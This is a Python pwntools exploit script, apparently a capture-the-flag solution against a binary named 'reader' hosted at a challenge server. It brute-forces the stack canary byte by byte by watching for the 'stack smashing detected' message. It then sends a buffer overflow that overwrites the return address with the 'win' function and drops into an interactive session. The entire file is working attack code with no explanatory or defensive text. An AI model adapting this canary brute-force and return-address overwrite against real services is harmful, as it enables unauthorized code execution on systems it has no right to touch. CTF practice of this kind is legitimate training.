#!/usr/bin/env python3

from pwn import *

exe = ELF("./reader")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("0.cloud.chals.io", 10677)

    return r


def main():
    r = conn()

    canary = b''
    for _ in range(8):
        for __ in range(256):
            print((_, __))
            r.recvuntil(b'data: ')
            r.send(b'A'*0x48 + canary + __.to_bytes(1, 'little'))
            if b'*** stack smashing detected ***' not in r.recvuntil(b'Enter'):
                canary += __.to_bytes(1, 'little')
                break
    
    log.info(f"{canary=}")

    r.sendlineafter(b'data: ', b'A'*0x48 + canary + b'A'*0x8 + p64(exe.symbols.win))
    r.interactive()


if __name__ == "__main__":
    main()
